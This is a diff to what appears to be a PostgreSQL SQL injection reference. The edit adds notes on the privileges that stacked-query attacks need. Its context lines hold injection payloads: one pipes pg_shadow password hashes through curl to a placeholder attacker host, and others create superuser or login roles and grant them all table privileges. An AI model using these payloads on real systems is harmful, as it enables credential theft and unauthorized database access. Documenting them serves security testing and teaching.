@@ -108,15 +108,28 @@ Using `COPY ... TO PROGRAM`:
 '; COPY (SELECT passwd FROM pg_shadow) TO PROGRAM 'curl http://attacker.com/?data=$(cat)'--
 ```
 
+**Privilege requirement:** `COPY ... TO PROGRAM` requires superuser privileges or membership in the `pg_execute_server_program` role (PostgreSQL 11+). This is typically unavailable in common SQL injection scenarios where the database user has restricted privileges.
+
 ### Creating Roles
 
 ```sql
--- Create superuser (requires privileges)
+-- Create superuser (requires existing superuser privileges)
 '; CREATE ROLE attacker WITH LOGIN PASSWORD 'password' SUPERUSER--
 
--- Grant privileges
+-- Create regular role (requires CREATEROLE privilege)
+'; CREATE ROLE attacker WITH LOGIN PASSWORD 'password'--
+
+-- Grant privileges (requires ownership or GRANT OPTION on target objects)
 '; GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO attacker--
 ```
+
+**Privilege requirements:**
+
+- Creating a role with `SUPERUSER` requires the attacker to already have superuser access—rarely achievable via typical SQL injection
+- Creating regular roles requires the `CREATEROLE` privilege on the current database user
+- Granting privileges requires ownership of the target objects or having received those privileges `WITH GRANT OPTION`
+
+These stacked queries are not broadly exploitable without elevated privileges on the compromised database user.
 
 ### Practical Attack Pattern
 
